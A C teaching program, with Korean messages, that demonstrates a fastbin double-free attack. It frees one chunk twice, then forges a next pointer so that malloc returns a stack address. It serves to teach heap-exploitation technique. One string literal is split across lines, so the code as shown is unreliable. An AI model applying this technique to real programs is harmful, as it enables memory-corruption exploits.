#include <stdio.h>
#include <stdlib.h>

int main()
{
	printf("이 파일은 fastbin_dup.c 의 malloc 을 속입니다.\n"
	       "제어 된 위치 (스택인 경우)의 포인터를 반환 합니다.\n");

	unsigned long long stack_var;

	printf("malloc() 은 다음과 같은 주소를 리턴 하고 싶습니다. %p.\n", 8+(char *)&stack_var);

	printf("버퍼 3개를 할당,\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	printf("1st malloc(8): %p\n", a);
	printf("2nd malloc(8): %p\n", b);
	printf("3rd malloc(8): %p\n", c);

	printf("첫번째 free....\n");
	free(a);

	printf("만약 우리가 다시 %p 를 free 한다면, %p가 free를 한 목록 맨위에 있기 떄문에 문제가 발생합니다..\n", a, a);
	// free(a);

	printf("그래서 대신에, 우리는 %p 를 free 할것입니다.\n", b);

	free(b);

	printf("그것이 free list의 맨 위에 있지 않기 때문에, 우리는 %p 를 다시 free 할수 있습니다\n", a);
	free(a);

	printf("이제 free 목록에 [%p, %p, %p] 가 있습니다.
우리는 이제 데이터 를 수정해서 %p 를 공격을 할 것 입니다.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	printf("1st malloc(8): %p\n", d);
	printf("2nd malloc(8): %p\n", malloc(8));
	printf("이제 free 목록에 [ %p ] 가 있습니다.\n", a);
	printf("이제 우리는 % p에 대한 접근 권한을 가지고 있는데, 그것은 free 목록의 윗 부분에 남아 있습니다.\n"
		"그래서 지금 우리는 가짜 free 사이즈 (이 경우 0x20)를 스택에 씁니다,\n"
		"그래서 malloc은 그곳에 free chunk가 있다고 생각하고 그곳에 어떠한 행위를 합니다.\n"
		"그것은 포인터를 리턴 합니다.\n", a);
	stack_var = 0x20;

	printf("이제 우리는 %p 에 있는 데이터의 처음 8 바이트를 0x20 바로 앞을 가리 키도록 덮어 씁니다.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	printf("3rd malloc(8): %p,  free 리스트에 스택 주소를 넣습니다.\n", malloc(8));
	printf("4rd malloc(8): %p\n", malloc(8));
}
